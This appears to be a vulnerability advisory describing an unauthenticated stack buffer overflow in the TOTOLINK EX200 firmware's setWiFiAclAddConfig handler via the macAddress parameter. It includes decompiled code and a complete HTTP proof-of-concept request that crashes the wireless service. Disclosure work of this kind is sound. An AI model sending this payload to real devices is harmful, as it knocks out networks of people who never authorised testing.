# TOTOLINK EX200: Stack-Based Buffer Overflow (CWE-121) in `setWiFiAclAddConfig` (`/cgi-bin/cstecgi.cgi` / `macAddress`)

## Summary

TOTOLINK EX200 web management interface (`setWiFiAclAddConfig` / `/cgi-bin/cstecgi.cgi`) is vulnerable to a stack-based buffer overflow via an overly long `macAddress` parameter, allowing an unauthenticated attacker to crash the wireless service or potentially achieve arbitrary code execution.

## Impact

- **Impact type:** Denial of Service (DoS) of the wireless service; potential Remote Code Execution (RCE) via stack corruption
- **Authentication required:** not required
- **Privilege:** root, because the wireless.so handler runs with elevated privileges on the device
- **User interaction:** not required

## Affected Products

- **Vendor:** TOTOLINK (Zioncom Electronics)
- **Product:** TOTOLINK EX200 300Mbps Wireless Range Extender
- **Vulnerability type:** Stack-Based Buffer Overflow (CWE-121)

### Tested vulnerable firmware

- V5.2.3c.7200

**Firmware download address:**  
https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/144/ids/36.html

> The vulnerability was verified on firmware version V5.2.3c.7200

## Attack Vector

- **Entry point:** `POST /cgi-bin/cstecgi.cgi`
- **Handler selector:** `setWiFiAclAddConfig`
- **Injection parameter:** `macAddress`
- **Authentication:** not required
- **User interaction:** not required

## Technical Details

The `wireless.so` handler in TOTOLINK EX200 exposes a function associated with `setWiFiAclAddConfig` and reachable through `/cgi-bin/cstecgi.cgi`. The handler requires no authentication and can be triggered remotely without user interaction. During request processing, the handler reads the user-controlled `macAddress` parameter via `websGetVar(a2, "macAddress", "")`, tokenizes it with `strtok` into `src`, and copies each token into the fixed-size stack buffer `dest` with `strcat(dest, src)` in a loop. No length validation is performed on the input, so an overlong `macAddress` value overflows the destination buffer.

The vulnerable function flow, based on the decompiled firmware analysis, is:

```c
v42 = (char *)websGetVar(a2, "macAddress", "");
src = strtok(s, ":");
if ( src == 0 )
  return 0;
do
{
  strcat(dest, src);          // unsafe append into fixed-size stack buffer
  src = strtok(0, ":");
}
while ( src != 0 );
```

![Decompiled code showing the vulnerable macAddress flow](assets/image-20260417165501-96jywot.png)

The vulnerability flow - numbered steps:

1. **Unvalidated external input**  
   The handler obtains the `macAddress` value directly from the incoming HTTP request via `websGetVar(a2, "macAddress", "")`. The endpoint performs no authentication, so any network-reachable attacker can supply it.

2. **Unsafe stack copy**  
   The externally controlled `macAddress` string is split by `strtok` and each token is appended to the stack buffer `dest` with `strcat`. Because the append loop does not enforce the destination size, an overlong value overflows the stack frame.

3. **Execution with system-level privileges**  
   The vulnerable operation occurs inside the `wireless.so` handler, which runs with elevated privileges. In testing, the immediate result was an HTTP 500 Internal Server Error and a crash / denial of service, and a sufficiently controlled overwrite could have broader security impact.

Overall, this matches **CWE-121: Stack-Based Buffer Overflow**.

## Proof of Concept (PoC)

### Steps to reproduce

1. Connect to the TOTOLINK EX200 web management interface.
2. Send a crafted POST request to `/cgi-bin/cstecgi.cgi` carrying `topicurl=setting/setWiFiAclAddConfig`, with `addEffect=0` and an excessively long `macAddress` value to overflow the stack buffer `dest`.
3. Observe that the wireless service crashes and the device becomes unreachable, confirming the denial of service.

### Example request

The following request sends an overlong `macAddress` value with `addEffect=0` to trigger the stack overflow in `setWiFiAclAddConfig`.

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 71.226.252.133
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 1581
Origin: http://71.226.252.133
Connection: keep-alive
Referer: http://71.226.252.133/login.asp

{"topicurl":"setting/setWiFiAclAddConfig",
"addEffect":"0",
"macAddress":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}
```

### Verification

After the request is sent, the server responds with `HTTP/1.1 500 Internal Server Error` and the wireless service crashes, making the device unreachable for a short period and confirming a denial of service.

**Vulnerable code / analysis evidence:**
![](assets/image-20260417165501-96jywot.png)

**Observed result:**
![](assets/image-20260417165646-1z66yyf.png)
